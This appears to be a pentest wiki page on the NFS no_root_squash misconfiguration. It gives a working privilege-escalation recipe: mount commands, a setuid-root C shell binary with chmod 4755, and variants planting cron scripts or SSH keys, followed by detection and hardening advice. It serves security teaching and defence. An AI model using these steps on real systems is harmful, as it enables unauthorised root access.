---
title: NFS no_root_squash
slug: nfs-no-root-squash
---

> **TL;DR:** When an NFS export is configured with `no_root_squash`, an attacker who is root on *any* client can write a setuid-root binary into the share and execute it on the server, getting root on the target.

## What it is
By default, the NFS server "squashes" client UID 0 to the unprivileged `nobody`/`nfsnobody` UID — the `root_squash` option. With `no_root_squash`, the server honours UID 0 from the client, meaning a remote root can create files as root (including setuid binaries). Combined with a writable share that's mounted on the target, this is one of the cleanest privesc paths in the catalogue.

## Preconditions / where it applies
- Target host runs nfsd and exports a share with `no_root_squash` (check `/etc/exports` or `showmount -e`)
- The attacker can mount that share from a machine where they have root (any VM / Kali box / VPS counts)
- The share is mounted on the target somewhere whose mount options don't include `nosuid`
- The attacker has any local shell on the target to execute the planted binary

## Technique

**1. Discover the misconfig:**
```bash
showmount -e 10.10.10.20
# Export list for 10.10.10.20:
# /opt/backups *(rw,sync,no_root_squash,no_subtree_check)
```

Read `/etc/exports` on the server if you can:
```bash
cat /etc/exports
# /opt/backups *(rw,no_root_squash)
```

**2. Mount on the attacker box** (where you are root):
```bash
sudo mkdir /mnt/loot
sudo mount -t nfs 10.10.10.20:/opt/backups /mnt/loot -o vers=3
```

NFSv3 is the easiest because it's UID-based (`AUTH_SYS`). If only v4 is offered, mount with `-o vers=4` — `no_root_squash` still applies for the system-auth case.

**3. Plant a setuid-root shell binary:**
```c
// shell.c
#include <unistd.h>
int main(void) {
    setuid(0); setgid(0);
    execl("/bin/sh", "sh", "-p", NULL);
    return 0;
}
```
```bash
gcc -static -o /mnt/loot/.s shell.c   # static to dodge libc mismatch
sudo chown root:root /mnt/loot/.s
sudo chmod 4755 /mnt/loot/.s
```

**4. Execute on the target** through your existing low-priv shell:
```bash
ls -la /opt/backups/.s    # confirm 4755 root:root
/opt/backups/.s
# id
# uid=0(root) gid=0(root) ...
```

**Variants:**
- `no_all_squash` (and you control any UID on the client) — write files as any UID, useful for impersonating a specific user
- Squash-root but writable share — drop a malicious script that's already in someone's cron path
- If the share is mounted `nosuid` on the target, fall back to dropping SSH `authorized_keys` into a privileged user's home if their home is on the share

## Detection and defence
- Audit `/etc/exports`: default to `root_squash`, prefer `all_squash` for public shares
- Always mount client-side with `nosuid,nodev,noexec` for any share that doesn't need code execution
- Replace AUTH_SYS with Kerberos (`sec=krb5p`) so client-side UID is no longer trusted
- Network ACL: restrict export visibility (`/path host(rw,...)` with specific subnets, not `*`)
- Detection: nfsd telemetry on setuid file creation; auditd watch on `/opt/<share>` for `chmod 4xxx`

## References
- [Linux NFS exports(5)](https://man7.org/linux/man-pages/man5/exports.5.html) — option reference including `root_squash`
- [HackTricks — NFS no_root_squash](https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html) — full recipe
- [GTFOBins — NFS](https://gtfobins.github.io/) — companion shell payloads

Related: [[suid-sgid-binaries]], [[linux-privesc-vectors]], [[writable-passwd-shadow]].
